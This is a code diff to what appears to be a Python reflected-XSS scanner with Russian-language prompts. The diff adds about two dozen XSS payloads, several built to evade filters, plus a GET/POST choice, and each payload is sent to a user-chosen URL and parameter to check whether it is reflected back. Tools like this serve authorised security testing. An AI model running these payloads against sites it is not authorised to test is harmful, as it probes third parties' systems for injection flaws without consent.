@@ -18,7 +18,30 @@ payloads = [
     "<img src/onerror=prompt(8)>",
     "<image src =q onerror=prompt(8)>",
     "<img src =q onerror=prompt(8)>",
-    "</scrip</script>t><img src =q onerror=prompt(8)>"
+    "</scrip</script>t><img src =q onerror=prompt(8)>",
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "<body onload=alert(1)>",
+    "<iframe src='javascript:alert(1)'></iframe>",
+    "<input onfocus=alert(1) autofocus>",
+    "<video><source onerror='alert(1)'></video>",
+    "<details open ontoggle=alert(1)>",
+    "<marquee onstart=alert(1)>XSS</marquee>",
+    "<math><mtext><img src=x onerror=alert(1)></mtext></math>",
+    "<scr<script>ipt>alert(1)</scr</script>ipt>",
+    "<<script>alert(1)//<</script>",
+    "<script/src=data:text/javascript,alert(1)>",
+    "<svg><script xlink:href=data:,alert(1)></script></svg>",
+    "<img ''='' onerror=alert(1)>",
+    "<img src=x:alert(1) onerror=eval(src)>",
+    "<a href=JaVaScRiPt:alert(1)>click</a>",
+    "<script>/*--><script>alert(1)//--></script>",
+    "<script>eval('alert(1)')</script>",
+    "<script>prompt(1337)</script>",
+    "<script>confirm('XSS')</script>",
+    "<img src=1 onerror=eval('alert(1)')>",
+    "<script>Function('alert(1)')()</script>"
 ]
 
 def vibor():
@@ -27,6 +50,11 @@ def vibor():
     return choice
 
 save_format = vibor()
+
+method = input("Выбери метод запроса (GET или POST): ").strip().upper()
+if method not in ["GET", "POST"]:
+    print("Неверный метод. По умолчанию используется GET.")
+    method = "GET"
 
 headers = {
     "User-Agent": "Mozilla/5.0 (VenturaCounty; Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.89"
@@ -38,11 +66,14 @@ param = input("Выбери имя параметра(например, q): ").s
 print("\nПроверка на xss")
 
 for payload in payloads:
-    encoded_payload = urllib.parse.quote(payload)
-    test_url = f"{url}?{param}={encoded_payload}"
-
     try:
-        response = requests.get(test_url, headers=headers)
+        if method == "POST":
+            test_url = url
+            response = requests.post(test_url, headers=headers, data={param: payload})
+        else:
+            encoded_payload = urllib.parse.quote(payload)
+            test_url = f"{url}?{param}={encoded_payload}"
+            response = requests.get(test_url, headers=headers)
         worked = payload in response.text
         print(f"{'сработал' if worked else 'не сработал'} {payload}")
 
